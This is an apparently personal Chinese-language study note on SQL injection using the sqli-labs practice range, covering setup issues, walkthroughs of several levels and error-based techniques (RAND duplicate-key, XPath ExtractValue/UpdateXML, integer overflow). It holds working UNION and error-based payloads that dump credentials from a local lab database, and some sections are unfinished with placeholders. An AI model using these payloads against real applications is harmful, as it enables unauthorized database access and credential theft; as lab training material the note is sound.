# SQL注入
# §1 SQLi-lab

[SQLI labs](https://github.com/Audi-1/sqli-labs)是一个基于PHP和MySQL的开源SQL注入靶场。本节介绍各个安装流程和常踩的坑。

## §1.1



## §1.2 注意事项

## 

### §1.2.1 `mysql`和`mysqli`

在初始化数据库时，即使已经启用了`php_mysql.dll`扩展，可能仍然会遇到找不到`mysql_connect()`的报错：

```
PHP Fatal error: Uncaught Error: Call to undefined function mysql_connect()
```

根据[PHP官方文档](https://www.php.net/manual/en/function.mysql-connect.php)，从PHP 5.5.0版本起，`php_mysql.dll`扩展将被弃用，取而代之的是`php_mysqli.dll`和`php_pdo_mysql.dll`。而该靶场使用的函数定义于被弃用的扩展中，所以会报错。要么把所有`mysql_`开头的函数全部替换成`mysqli_`，要么回退到PHP旧版本。

### §1.2.2 魔法引号

PHPStudy在`php.ini`中默认开启了魔法引号功能，该功能可以在GET/POST/COOKIE中的所有单引号、双引号、反斜杠、`\0`NULL字符之前加上反斜杠进行转义。该靶场的payload都基于这些特殊字符，因此一定要关闭该功能。

```ini
; Magic quotes for incoming GET/POST/Cookie data.
magic_quotes_gpc = Off
```

### §1.2.3 HackBar吞空格

众所周知，SQL语句的注释符`--`后面必须加一个空格，才能后接注释文本，否则该注释无效，并引起报错。而HackBar这款浏览器插件好死不死的吞末尾空格，导致你必须给`GET`请求的参数后手动添加一个UrlEncode空格字符`%20`才行。

### §1.2.4 Url编码`+`被替换为空格

根据[这篇StackOverflow问题下的回答](https://stackoverflow.com/questions/1005676/does-a-in-a-url-scheme-host-path-represent-a-space)，在历史上，Url编码规则经历了多个不同的标准：

- 在[RFC-1738](https://www.ietf.org/rfc/rfc1738.txt)标准中，为防止`&`等特殊字符干扰参数值导致二义性，需要将其准换成`%hh`形式。但是该标准本身没有提到如何处理`+`这一字符。[HTML 401](https://www.w3.org/TR/html401/)标准的[§17.13.4 Form content types](https://www.w3.org/TR/html401/interact/forms.html#h-17.13.4.1)一节中进行了补充，特别说明**空格被编码成`+`**。

  > <center>application/x-www-form-urlencoded</center>
  >
  > This is the default content type. Forms submitted with this content type must be encoded as follows:
  > `x-www-form-urlencoded`是默认使用的内容格式，使用这种格式提交的内容必须符合以下编码规则：
  >
  > 1. Control names and values are escaped. Space characters are replaced by `+`, and then reserved characters are escaped as described in `RFC1738`, section 2.2:...
  >    控制字符必须经过转义。**空格字符应被替换为`+`**，其余的保留字符应按照`RFC1738`2.2节的标准进行转义：...
  > 2. ...

- 在[RFC-3986](https://www.rfc-editor.org/rfc/rfc3986#section-2.4)标准中，所有可能产生二义性的字符都必须被强制转义，包括空格。

  > <center>2.4 When to Encode or Decode</center>
  >
  > When a URI is dereferenced, the components and subcomponents significant to the scheme-specific dereferencing process (if any) must be parsed and separated before the percent-encoded octets within those components can be safely decoded, as otherwise the data may be mistaken for component delimiters.
  > 在该标准规定的解码流程中，当URI被解码时，如果存在干扰该流程的组件与子组件，那么这些组件与子组件必须经过转换，从而与真正的分隔符区分开来，然后才能保证Url编码不会造成二义性，否则这些组件与子组件可能被误认为是组件分割符。

根据PHP的关于[超全局变量`$_GET[]`](https://www.php.net/manual/zh/reserved.variables.get.php)和[函数`urlencode()`](https://www.php.net/manual/zh/function.urldecode.php)的官方文档，`$_GET[]` 是通过`urldecode()`传递的，而该函数执行的恰好是`RFC-1738`标准，会将`+`替换为空格。另有`rawurldecode()`函数执行的是`RFC-3986`标准。

> <center>$_GET</center>
>
> 注意:GET是通过[urldecode()](https://www.php.net/manual/zh/function.urldecode.php)传递的。
>
> <center>urldecode()</center>
>
> 解码给出的已编码字符串中的任何 `%##`。加号（`+`）被解码成一个空格字符。
>
> <center>rawurldecode()</center>
>
> 注意:`rawurldecode()`不会把加号（`+`）解码为空格，而`urldecode()`可以。
>

### §1.2.5 SQL中的`'`与`''`

SQL中的字符串两侧可以用单引号或双引号。当使用单引号时，如果字符串中还包含单引号，就会引起二义性：

```sql
SELECT * FROM ... WHERE title='I'm a CTFer';
```

这时，我们应该给字符串中的单引号进行转义，变成`''`的形式：

```sql
SELECT * FROM ... WHERE title='I''m a CTFer';
```

????????????????????[四种方式](https://www.databasestar.com/sql-escape-single-quote/)

### §1.2.6 SQL的括号/引号嵌套

| 外层\payload |      |      |      |      |      |
| ------------ | ---- | ---- | ---- | ---- | ---- |
|              |      |      |      |      |      |
| ''           |      |      |      |      |      |
| ""           |      |      |      |      |      |
| ''''         |      |      |      |      |      |
| """"         |      |      |      |      |      |
| ()           |      |      |      |      |      |
| ('')         |      |      |      |      |      |
| ("")         |      |      |      |      |      |
| '()'         |      |      |      |      |      |
| "()"         |      |      |      |      |      |
|              |      |      |      |      |      |



## §1.3 题解

### §1.3.1 第1关 绕过`''`

我们以这行代码入手：

```php
$sql = "SELECT * FROM users WHERE id='$id' LIMIT 0,1";
```

显然，`$id`中若含有单引号便可实现逃逸的效果，比如最经典的`1' or '1'='1`。

了解后，我们假装不知道源代码，开始逐步构建payload，猜测语句结构。

首先试一下正常输入，均正常：

```sql
id=1		-- Login name: Dumb		Password: Dumb
id=2		-- Login name: Angelina	Password: I-kill-you
id=1000		-- Login name: 			Password:
```

尝试单引号，报错；尝试两个单引号，正常。可以猜测语句中肯定包含单引号。同时`LIMIT`告诉我们最多输出一条结果。

```sql
id=1		-- Login name: Dumb		Password: Dumb
id=1'		-- You have an error in your SQL syntax; ... near ''1'' LIMIT 0,1' at line 1
id=1''		-- Login name: Dumb		Password: Dumb
```

知道语句包含单引号后，我们就可以猜测语句大概如下所示：

```sql
SELECT ? FROM ? WHERE ?='$id' LIMIT 0,1 ? ;
```

接下来使用`ORDER BY`爆列数，同时使用`--`注释掉`LIMIT`语句，得到列数为3：

```sql
id=1 ORDER BY 1 --  (一定要在--后面加空格,才能识别为有效的注释)
=> SELECT ? FROM ? WHERE ?='   1' ORDER BY 1 --   ' LIMIT 0,1 ? ;
=> SELECT ? FROM ? WHERE ?='1' ORDER BY 1;
			-- Login name: Dumb		Password: Dumb
id=1‘ ORDER BY 2 -- 
=> SELECT ? FROM ? WHERE ?='   1' ORDER BY 2 --   ' LIMIT 0,1 ? ;
=> SELECT ? FROM ? WHERE ?='1' ORDER BY 2;
			-- Login name: Dumb		Password: Dumb
id=1‘ ORDER BY 3 -- 
=> SELECT ? FROM ? WHERE ?='   1' ORDER BY 3 --   ' LIMIT 0,1 ? ;
=> SELECT ? FROM ? WHERE ?='1' ORDER BY 3;
			-- Login name: Dumb		Password: Dumb
id=1‘ ORDER BY 4 -- 
=> SELECT ? FROM ? WHERE ?='   1' ORDER BY 4 --   ' LIMIT 0,1 ? ;
=> SELECT ? FROM ? WHERE ?='1' ORDER BY 4;
			-- Unknown column '4' in 'order clause'
```

利用`SELECT 1,2,3`建一张列数同样为3的新表，使用`UNION`语句爆字段与列序的关系。虽然注释了`LIMIT`，但是前端始终只显示一条记录，因此我们还要在`WHERE`中设置一个自相矛盾的条件，来把正常的那条记录给干掉，只留下我们的创建的新表：

```sql
id=1' union select 1,2,3 -- 
=> SELECT * FROM users WHERE id='1' union select 1,2,3 -- ' LIMIT 0,1
			+----+----------+----------+
			| id | ???????? | ???????? |
			+----+----------+----------+
			|  1 | Dumb     | Dumb     |
			|  1 | 2        | 3        |
			+----+----------+----------+
			-- Login name: Dumb		Password: Dumb
id=2' and 1=2 union select 1,2,3 -- 
=> SELECT * FROM users WHERE id='2' and 1=2 union select 1,2,3 -- ' LIMIT 0,1
			+----+----------+----------+
			| id | ???????? | ???????? |
			+----+----------+----------+
			|  1 | 2        | 3        |
			+----+----------+----------+
			-- Login name: 2		Password: 3
			可知第二列与用户名相关,第三列与密码相关
```

用`database()`函数爆当前SQL语句执行的数据库名：

```sql
id=1' AND 1=2 UNION SELECT 1,DATABASE(),3 --+
=> SELECT * FROM users WHERE id='1' AND 1=2 UNION SELECT 1,DATABASE(),3 -- ' LIMIT 0,1
			-- Login name: security	Password: 3
			可知当前数据库名为security
```

用`information_schema`数据库中的`schemata`表爆所有数据库名，果然存在之前爆出的`security`：

```sql
id=1' AND 1=2 union select 1,(select group_concat(schema_name) from information_schema.schemata),3 -- 
=> SELECT * FROM users WHERE id='1' AND 1=2 union select 1,(select group_concat(schema_name) from information_schema.schemata),3 -- ' LIMIT 0,1
			+----+----------------------------------------------------------------------+----------+
			| id | ????????                                                             | ???????? |
			+----+----------------------------------------------------------------------+----------+
			|  1 | information_schema,challenges,mysql,performance_schema,security,test | 3        |
			+----+----------------------------------------------------------------------+----------+
			-- Login name: information_schema,challenges,mysql,performance_schema,security,test		Password: 
```

用`information_schema`数据库中的`tables`表爆`security`数据库的所有表名：

```sql
id=1' AND 1=2 union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3 -- 
=> SELECT * FROM users WHERE id='1' AND 1=2 union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3 -- ' LIMIT 0,1
			-- Login name: emails,referers,uagents,users	-- Password: 3
```

猜测`users`表存放着用户数据。用`information_schema`数据库中的`columns`表，爆`security`数据库中`users`表的所有列名：

```sql
id=1' AND 1=2 UNION SELECT 1,(SELECT GROUP_CONCAT(COLUMN_NAME) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='users'),3 --+
=> SELECT * FROM users WHERE id='1' AND 1=2 UNION SELECT 1,(SELECT GROUP_CONCAT(COLUMN_NAME) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='users'),3 -- ' LIMIT 0,1
			-- Login name: id,username,password		-Password: 3
```

根据列名爆全表：

```sql
id=1' AND 1=2 UNION SELECT 1,(SELECT GROUP_CONCAT(username) FROM security.users),(SELECT GROUP_CONCAT(password) FROM security.users) --+
SELECT * FROM users WHERE id='1' AND 1=2 UNION SELECT 1,(SELECT GROUP_CONCAT(username) FROM security.users),(SELECT GROUP_CONCAT(password) FROM security.users) -- ' LIMIT 0,1
			-- Login name: Dumb,Angelina,Dummy,secure,stupid,superman,batman,admin,admin1,admin2,admin3,dhakkan,admin4
			-- Password: Dumb,I-kill-you,p@ssword,crappy,stupidity,genious,mob!le,admin,admin1,admin2,admin3,dumbo,admin4
```

### §1.3.2 第2关 不绕过

先按正常流程试一遍：

- `id=1`，正常
- `id=1'`，报错，`Wrong syntax near '' LIMIT 0,1' at line 1`
- `id=1''`，报错，`Wrong syntax near ''' LIMIT 0,1' at line 1`

至此可推断，SQL语句肯定没有形如`'id'`的部分，而是直接将`id`暴露在外。只需将第1关中的payload从`id=1'`改为`id=1`即可，其余步骤同上。

### §1.3.3 第3关 绕过`('')`

先按正常流程试一遍：

- `id=1`，正常
- `id=1'`，报错，`Wrong syntax near ''1'') LIMIT 0,1' at line 1`
- `id=1''`，正常

因为两个单引号正常，所以一定有``''`。容易发现，相比与第2关，单引号报错多了一个右括号。将`1'`看作一个整体，报错信息给出的部分语句形如`'$id') LIMIT 0,1`，立即可以推测出语句为`WHERE ?=('$id')`。只需将第1关中的payload从`id=1'`改为`id=1')`即可，其余步骤同上。

### §1.3.4 第4关 绕过`("")`

先按正常流程试一遍：

- `id=1`，正常
- `id=1'`，正常
- `id=1''`，正常

再试一下双引号：

- `id=1"`：报错，`Wrong syntax to use near '"1"") LIMIT 0,1' at line 1`
-  `id=1""`：正常

类比于第3关，报错信息给出的部分语句形如`"$id") LIMIT 0,1`。只需将第1关中的payload从`id=1'`改为`id=1")`即可，其余步骤同上。

### §1.3.5 第5关 报错注入

报错有回显先按正常流程试一遍：

- `id=1`，正常
- `id=1'`，报错，`Wrong syntax to use near ''1'' LIMIT 0,1' at line 1`
- `id=1' --+`，正常
- `id=1"`，正常

据此可推测，SQL语句形如`'$id' LIMIT 0,1`。

`ORDER BY`爆列数为4：

```sql
id=1' ORDER BY 3 --+
=> SELECT ? FROM ? WHERE ID='1' ORDER BY 3 -- ' LIMIT 0,1
		# You are in...........
id=1' ORDER BY 4 --+
=> SELECT ? FROM ? WHERE ID='1' ORDER BY 4 -- ' LIMIT 0,1
		# Unknown column '4' in 'order clause'
```

尝试`SELECT`爆字段与列序的关系，结果未返回任何一个期望值，这说明返回值与数据库无关，是一个写死的值：

```sql
id=1’ and 1=2 union select 1,2,3 --+
		# You are in...........	(不是1,2,3种的任何一个)
```

这种情况下，输出正常只能告诉我们语句执行成功，不能输出我们想要的信息，只能通过输出报错了。

1. 解法一 双查询注入

   以下步骤的原理详见[§3.1 双查询注入](#§3.1 双查询注入)一节：

   ```sql
   id=1' union select 1,count(*), concat((select database()), floor(rand()*2))as a from information_schema.tables group by a --+
   => SELECT * FROM users WHERE id='1' union select 1,count(*), concat((select database()), floor(rand()*2))as a from information_schema.tables group by a -- ' LIMIT 0,1;
   => SELECT * FROM users WHERE id='1' union select 1,count(*), concat((select database()), floor(rand()*2))as a from information_schema.tables group by a;
   		--	Duplicate entry 'security0' for key 'group_key'
   		我们构建的恶意payload:database()得到了执行.
   ```

   其余步骤同上：

   ```sql
   1' union select 1,count(*), concat((
   select concat( (select group_concat(username) from security.users) , (select group_concat(password) from security.users) , floor(rand()*2) )
   ), floor(rand()*2))as a from information_schema.tables group by a
   
   
   
   SELECT * FROM users WHERE id='1' union select 1,count(*), concat((
   select concat( (select group_concat(username) from security.users) , (select group_concat(password) from security.users) , floor(rand()*2) )
   ), floor(rand()*2))as a from information_schema.tables group by a;
   
   
   
   
   
   http://localhost/SQLi-labs/Less-5/
   ?id=1' union select 1,count(*), concat(
   
   (    select concat( (select group_concat(username) from security.users) , (select group_concat(password) from security.users)    )     ),
   floor(rand()*2)
   
   )  as a from information_schema.tables group by a --+
   
   
   
   
   
   select count(*), concat((select group_concat(username) from security.users), floor(rand()*2))as a from *information_schema.tables* group by a
   
   ??????????????????????????????
   ```

2. 解法二 XPath注入

   以下步骤的原理详见[3.1.2 XPath注入](#3.1.2 XPath注入)。

   爆数据库名：

   ```sql
   payload = ?id=1' and extractvalue('',concat(0x30,(select database())))--+
   	XPATH syntax error: 'security'
   ```

   爆表名：

   ```sql
   payload = ?id=0' and extractvalue(0x0a,concat(0x30,(select group_concat(table_name) from information_schema.tables where table_schema=database()))) --+
   	XPATH syntax error: 'emails,referers,uagents,users'
   ```

   爆列名：

   ```sql
   payload = ?id=0' and extractvalue(0x0a,concat(0x0a,(SELECT GROUP_CONCAT(COLUMN_NAME) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='users'))) --+
   	XPATH syntax error: 'id,username,password'
   ```

   爆记录：

   ```sql
   payload = ?id=0' and extractvalue(0x0a,concat(0x0a,(SELECT GROUP_CONCAT(username) FROM users ))) --+
   	XPATH syntax error: 'Dumb,Angelina,Dummy,secure,stup' (32字符限制)
   ```

   





```









### §1.3.7 第7关 导出数据库

尝试输入正常数据`id=1`，得到提示`You are in.... Use outfile......`，让我们使用`outfile`语句。

尝试`id=1'`，报错提示为`''1'')) LIMIT 0,1'`附近有语法错误，可知注入点由一层单引号和两层小括号包围而成，可以通过`1'))`绕过。

尝试`id=1')) --+`，输出结果恢复正常。

 ？？？？？？？？？？？？？？？？？？？？？？





### §1.3.8 第8关 布尔盲注

```php
$sql="SELECT * FROM users WHERE id='$_GET['id']' LIMIT 0,1";
if(mysql_fetch_array(mysql_query($sql))){
    echo 'Success';
}else{
    echo 'error';
}
```

穷举`database()`的字符串个数，



# §3 SQL注入方法论

## §3.1 错误注入（Error Based）

> 注意：[MySQL源码](https://github.com/mysql/mysql-server/blob/3e90d07c3578e4da39dc1bce73559bbdf655c28c/mysys/my_error.cc)中的`ERRMSGSIZE`限制了错误信息的长度。
>
> ```c++
> /* Max length of a error message. Should be kept in sync with MYSQL_ERRMSG_SIZE.
>  */
> #define ERRMSGSIZE (512)
> ```

### §3.1.1 主键重复注入

子查询的格式是`(SELECT (payload))`，该语句的作用相当于创建一张新表，可以根据将payload解析为字段名或表达式，MySQL对其计算后返回相应的计算值。

```sql
SELECT CONCAT((SELECT 1+1));
			+----------------------+
			| CONCAT((SELECT 1+1)) |
			+----------------------+
			| 2                    |
			+----------------------+
```

同理，我们可以给payload传MySQL内置的各类函数：

```sql
SELECT CONCAT((SELECT DATABASE()));
			+-----------------------------+
			| CONCAT((SELECT DATABASE())) |
			+-----------------------------+
			| security                    |
			+-----------------------------+
SELECT CONCAT(
    	(
            SELECT GROUP_CONCAT(TABLE_NAME) 
   			FROM INFORMATION_SCHEMA.TABLES
   			WHERE TABLE_SCHEMA='security'
        )
	)
	AS something;
			+-------------------------------+
			| something                     |
			+-------------------------------+
			| emails,referers,uagents,users |
			+-------------------------------+
```

2016年，一位用户发现并提交了MySQL中[RAND()引发的运行时错误](https://bugs.mysql.com/bug.php?id=82544)，**只要`count()`、`group by`/`order by`、`rand()`**三者一起用就有几率报错，官方确认后将其写入到[官方文档](https://dev.mysql.com/doc/refman/5.7/en/mathematical-functions.html#function_rand)中：

> Use of a column with RAND() values in an ORDER BY or GROUP BY clause may yield unexpected results because for either clause a RAND() expression can be evaluated multiple times for the same row, each time returning a different result.
> 如果在`ORDER BY`或`GROUP BY`子句中使用的列名含有`RAND()`函数的表达式，则可能会输出不可预料的结果。这是因为对于同一行而言，每个由`rand()`表达式多次取值得到的子句都会返回不同的值。

官方文档的解释比较粗略，一篇来自先知社区的博文[MYSQL报错注入的一点总结](https://xz.aliyun.com/t/253)的解释如下：

> 以`SELECT count(*) FROM users GROUP BY username`这一SQL语句为例，`group by`子句需要某个表达式作为分组的依据，对每一行都需要运行一次该表达式——如果该表达式的值没有出现在临时表中，则向临时表中创建这一行‘如果已经出现在临时表中，则令`count(*)`自增`1`：
>
> ```
> mysql> select * from users;
> +------+-----------+
> | id   | username  |
> +------+-----------+
> | 0    | jack      |
> | 1    | jack      |
> | 2    | tom       |
> +------+-----------+
> ```
>
> 1. 执行`SELECT count(*) FROM users GROUP BY username`，首先MySQL会创建一张临时表：
>
>    | `username`(主键) | `count(*)` |
>    | ---------------- | ---------- |
>
> 2. 接着读取`users`表的第一行，执行`username`表达式，得到值`jack`，发现临时表的主键中没有`jack`这一项，于是创建一行：
>
>    | `username`(主键) | `count(*)` |
>    | :--------------: | :--------: |
>    |      `jack`      |     1      |
>
> 3. 接着读取`users`表的第二行，执行`username`表达式，得到值`jack`，发现临时表主键中已经有`jack`这一项了，于是`count(*)`自增：
>
>    | `username`(主键) | `count(*)` |
>    | :--------------: | :--------: |
>    |      `jack`      |     2      |
>
> 4. 接着读取`users`表的第一行，执行`username`表达式，得到值`tom`，发现临时表的主键中没有`tom`这一项，于是创建一行：
>
>    | `username`(主键) | `count(*)` |
>    | :--------------: | :--------: |
>    |      `jack`      |     2      |
>    |      `tom`       |    `1`     |
>
> 上述步骤十分的正常。我们知道主键不能重复，而上述的流程保证了“如果主键已经存在，则不再创建重复的主键”。有没有一种方法，能欺骗程序“假装主键不存在，实际上存在”呢？也就是说，我们想让同一个表达式在“判断阶段”与“添加阶段”的值不一样。这里我们就需要用到`RAND()`函数。
>
> 我们知道，`RAND([seed])`函数能随机返回一个`[0,1)`内的浮点数，并提供一个可选的随机数种子参数`seed`。使用`FLOOR()`函数可以创造一个二项分布随机变量：`FLOOR(RAND(0)*2)`。
>
> ```sql
> mysql> select rand(0) from users;
> +---------------------+
> | rand(0)             |
> +---------------------+
> | 0.15522042769493574 |
> |   0.620881741513388 |
> |  0.6387474552157777 |
> | 0.33109208227236947 |
> |  0.7392180764481594 |
> |  0.7028141661573334 |
> |  0.2964166321758336 |
> |  0.3736406931408129 |
> |  0.9789535999102086 |
> |  0.7738459508622493 |
> |  0.9323689853142658 |
> |  0.3403071047182261 |
> |  0.9044285983819781 |
> +---------------------+
> 13 rows in set (0.00 sec)
> 
> mysql> select rand(0),floor(rand(0)*2) from users;
> +---------------------+------------------+
> | rand(0)             | floor(rand(0)*2) |
> +---------------------+------------------+
> | 0.15522042769493574 |                0 |
> |   0.620881741513388 |                1 |
> |  0.6387474552157777 |                1 |
> | 0.33109208227236947 |                0 |
> |  0.7392180764481594 |                1 |
> |  0.7028141661573334 |                1 |
> |  0.2964166321758336 |                0 |
> |  0.3736406931408129 |                0 |
> |  0.9789535999102086 |                1 |
> |  0.7738459508622493 |                1 |
> |  0.9323689853142658 |                1 |
> |  0.3403071047182261 |                0 |
> |  0.9044285983819781 |                1 |
> +---------------------+------------------+
> 13 rows in set (0.00 sec)
> ```
>
> 这说明`floor(rand(0)*2)`这个序列为`[0,1,1,0,1,1,......]`
>
> 现在我们考虑这个SQL语句：`SELECT count(*) FROM users GROUP BY floor(rand(0)*2)`：
>
> 1. 执行`SELECT count(*) FROM users GROUP BY floor(rand(0)*2)`，首先MySQL会创建一张临时表：
>
>    | `floor(rand(0)*2)`(主键) | `count(*)` |
>    | ------------------------ | ---------- |
>
> 2. 接着读取`users`表的第一行，执行`floor(rand(0)*2)`表达式，得到值`0`，发现临时表的主键中没有`0`这一项，于是创建一行，新增的这一行的主键为`1`：
>
>    | `floor(rand(0)*2)`(主键) | `count(*)` |
>    | :----------------------: | :--------: |
>    |           `1`            |     1      |
>
> 3. 接着读取`users`表的第二行，执行`floor(rand(0)*2)`表达式，得到值`1`，发现临时表主键中已经有`1`这一项了，于是不再尝试新增一行并重新计算表达式，而是直接让`count(*)`自增：
>
>    | `floor(rand(0)*2)`(主键) | `count(*)` |
>    | :----------------------: | :--------: |
>    |           `1`            |     2      |
>
> 4. 接着读取`users`表的第一行，执行`floor(rand(0)*2)`表达式，得到值`0`，发现临时表的主键中没有`0`这一项，于是尝试创建一行，重新计算一遍表达式，得到`1`，并将其作为新增行的主键：
>
>    | `floor(rand(0)*2)`(主键) | `count(*)` |
>    | :----------------------: | :--------: |
>    |           `1`            |     2      |
>    |           `1`            |     1      |
>
> 至此问题出现了——不能重复的主键竟然重复了！MySQL敏锐地察觉到了这一问题，并且阻止程序添加新行，于是程序会爆出`ERROR 1062 (23000): Duplicate entry '<ColumnNameWithRAND()>' for key 'group_key'`的错误。其中`<ColumnNameWithRAND()>`是所需表达式执行后的结果，利用这一点可以实现错误注入。
>
> ```sql
> SELECT CONCAT((SELECT database()),floor(rand()*2)) AS something
> 	FROM INFORMATION_SCHEMA.TABLES
> 	WHERE TABLE_SCHEMA='security';
> 			+-----------+
> 			| something |
> 			+-----------+
> 			| security0 |
> 			| security0 |
> 			| security1 |
> 			| security0 |
> 			+-----------+
> SELECT CONCAT((SELECT database()),floor(rand()*2)) AS something
> 	FROM INFORMATION_SCHEMA.TABLES
> 	WHERE TABLE_SCHEMA='security'
> 	GROUP BY something;
> 			+-----------+
> 			| something |
> 			+-----------+
> 			| security0 | 
> 			| security1 |
> 			+-----------+
> -- 执行下列语句会得到不同的结果，自检得到成功频率=41/80，失败频率=39/80，大概五五开
> SELECT
> 	COUNT(*),
> 	CONCAT((SELECT database()),floor(rand()*2)) AS something
> 	FROM INFORMATION_SCHEMA.TABLES
> 	WHERE TABLE_SCHEMA='security'
> 	GROUP BY something;
> 			-- ERROR 1062 (23000): Duplicate entry 'security0' for key 'group_key'
> 		或者
> 			+----------+-----------+
> 			| COUNT(*) | something |
> 			+----------+-----------+
> 			|        2 | security0 | # 爆database()
> 			|        2 | security1 |
> 			+----------+-----------+
> ```

### §3.1.2 XPath注入

MySQL内部定义了两个与XML相关的函数——`ExtractValue()`与`UpdateXML()`。（大小写不敏感）

- `ExtractValue(xml_frag, xpath_expr)`根据XPath表达式`xpath_expr`从XML字符串`xml_frag`中提取值：

  ```sql
  mysql> SET @xmlString = '<html><body><a>First</a><a>Second</a></body></html>';
  
  mysql> SELECT 1,EXTRACTVALUE(@xmlString,'/html/body/a[1]');
  +---+--------------------------------------------+
  | 1 | EXTRACTVALUE(@xmlString,'/html/body/a[1]') |
  +---+--------------------------------------------+
  | 1 | First                                      |
  +---+--------------------------------------------+
  1 row in set (0.00 sec)
  
  mysql> SELECT 2,EXTRACTVALUE(@xmlString,'/html/body/a[2]');
  +---+--------------------------------------------+
  | 2 | EXTRACTVALUE(@xmlString,'/html/body/a[2]') |
  +---+--------------------------------------------+
  | 2 | Second                                     |
  +---+--------------------------------------------+
  1 row in set (0.00 sec)
  
  mysql> SELECT 2,EXTRACTVALUE(@xmlString,'//a[2]');
  +---+-----------------------------------+
  | 2 | EXTRACTVALUE(@xmlString,'//a[2]') |
  +---+-----------------------------------+
  | 2 | Second                            |
  +---+-----------------------------------+
  1 row in set (0.00 sec)
  ```

- `UpdateXML(xml_target, xpath_expr, new_xml)`在XML字符串`xml_target`中寻找匹配XPath表达式`xpath_expr`的所有部分，并将其替换为`new_xml`：

  ```sql
  mysql> select UpdateXML('<a><b>ccc</b><d></d></a>', '/a', '<e>fff</e>'); # 匹配根标签
  +-----------------------------------------------------------+
  | UpdateXML('<a><b>ccc</b><d></d></a>', '/a', '<e>fff</e>') |
  +-----------------------------------------------------------+
  | <e>fff</e>                                                |
  +-----------------------------------------------------------+
  
  mysql> select UpdateXML('<a><b>ccc</b><d></d></a>', '//b', '<e>fff</e>'); # 匹配字标签
  +------------------------------------------------------------+
  | UpdateXML('<a><b>ccc</b><d></d></a>', '//b', '<e>fff</e>') |
  +------------------------------------------------------------+
  | <a><e>fff</e><d></d></a>                                   |
  +------------------------------------------------------------+
  1 row in set (0.00 sec)
  
  mysql> select UpdateXML('<a><b>ccc</b><b>ccc</b><d></d></a>', '//b', '<e>fff</e>'); # 多匹配项
  +----------------------------------------------------------------------+
  | UpdateXML('<a><b>ccc</b><b>ccc</b><d></d></a>', '//b', '<e>fff</e>') |
  +----------------------------------------------------------------------+
  | <a><b>ccc</b><b>ccc</b><d></d></a>                                   |
  +----------------------------------------------------------------------+
  1 row in set (0.00 sec)
  ```

当XPath表达式`xpath_expr`不符合语法时，MySQL将输出处理后的XPath表达式并报错。当这一变量完全可控时，我们就可以构造相应的恶意表达式来爆库。为了让XPath表达式不符合语法，我们可以使用`~`、`0x0a`这类特殊字符：

```sql
mysql> SELECT * FROM users WHERE id='1' and extractvalue('kk',concat('~',(select database())));
ERROR 1105 (HY000): XPATH syntax error: '~security'

mysql> select * from users where id='1' and updatexml('anything',concat('~',(select database())),'anything');
ERROR 1105 (HY000): XPATH syntax error: '~security'
```

> 注意：XPath表达式在XML字符串中找不到指定的元素时，并不会报错，而是默认隐藏警告，并且令函数返回`NULL`，只有通过`SHOW WARNINGS`语句才能看到。因此，这种XPath表达式依然符合语法，MySQL的函数也不会报错。
>
> 为了让XPath表达式真正的非法，从而让函数报错，我们需要在XPath表达式中加入非法字符。经实测，所有非法字符如下所示：
>
> ```python
> import requests
> 
> url = "http://localhost/SQLi-Labs/Less-5/?id=1' and extractvalue('',concat({},(select database())))--+"
> 
> for i in range(0,256):
>     hexChar = hex(i)
>     currentUrl = url.format(hexChar)
>     result = requests.get(currentUrl)
>     if "syntax error" in result.text:
>         print("{} extractvalue()报错".format(hexChar))
>     else: # 什么也没有
>         print("{} extractvalue()返回NULL".format(hexChar))
> /*
>     0x0~0x1f
>         (缺0x20:空格)
>     0x21~0x23:
>     `	(缺0x24:$)
>     0x25~0x2c
>         (缺0x2d:-)
>     0x2e:.
>         (缺0x2f:/)
>     0x30~0x3f:?
>         (缺0x40:@和0x41~0x5a的所有大写祖母)
>     0x5b~0x5e
>         （缺0x5f:_）
>     0x60:`
>         (缺0x61-0x7a的所有小写字母)
>     0x7b~0xff
> */
> ```

> 注意：经过实测，报错信息只能返回32个字符。再扣除一个非法字符，能返回的只有31个字符：
>
> ```sql
> mysql> select group_concat(password) from users;
> +--------------------------------------------------------------------------------------------------+
> | group_concat(password)                                                                           |
> +--------------------------------------------------------------------------------------------------+
> | Dumb,I-kill-you,p@ssword,crappy,stupidity,genious,mob!le,admin,admin1,admin2,admin3,dumbo,admin4 |
> +--------------------------------------------------------------------------------------------------+
> 
> mysql> SELECT * FROM users WHERE id='0' and extractvalue(0x0a,concat(0x0a,(select group_concat(password) from users)));
> ERROR 1105 (HY000): XPATH syntax error: ' Dumb,I-kill-you,p@ssword,crappy'
> ```
>
> 为了获取到完整的信息，我们只能使用`substring()`分批次获取：？？？？？？？？？？TODO：？？？
>
> ```
> 
> ```

> 注意：当且仅当`ExtractValue()`与`UpdateXML()`的返回值被当作布尔表达式应用于`WHERE`子句时，XPath表达式才会被解析到最终形态：
>
> ```sql
> // extractvalue()作为Select子句的列名时，不会被处理
> mysql> SELECT EXTRACTVALUE("anything",concat(~,(select database())));
> ERROR 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '(select database())))' at line 1
> ```

### §3.1.3 溢出注入

> 注意：溢出注入依赖于特定的MySQL版本——
>
> - MySQL < 5.5，整形溢出不会报错，本方法无效
> - 5.5.5 < MySQL < 5.5.47，整形溢出会报错，能够执行并返回payload，本方法生效
> - MySQL > 5.5.53，整形溢出会报错，但不会执行并返回payload，本方法失效

MySQL默认使用的整数类型是无符号型`BIGINT`，占用8个字节，最大值为$2^{64}-1=18446744073709551615$。

```sql
mysql> select 18446744073709551615;
+----------------------+
| 18446744073709551615 |
+----------------------+
| 18446744073709551615 |
+----------------------+
1 row in set (0.00 sec)

mysql> select 18446744073709551616;
+----------------------+
| 18446744073709551616 |
+----------------------+
| 18446744073709551616 |
+----------------------+
1 row in set (0.00 sec)

mysql> select 18446744073709551615 + 1;
    ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in '(18446744073709551615 + 1)'
```

我们也可以对`0`按位取反，快速得到最大值：

```sql
mysql> select ~0;
+----------------------+
| ~0                   |
+----------------------+
| 18446744073709551615 |
+----------------------+
1 row in set (0.00 sec)

mysql> select ~0 + 1;
    ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in '(~(0) + 1)'
```

我们知道，如果一个`SELECT`子句执行成功，那么它的返回值可以视为`0`：

```sql
mysql> select (select user());
+-----------------+
| (select user()) |
+-----------------+
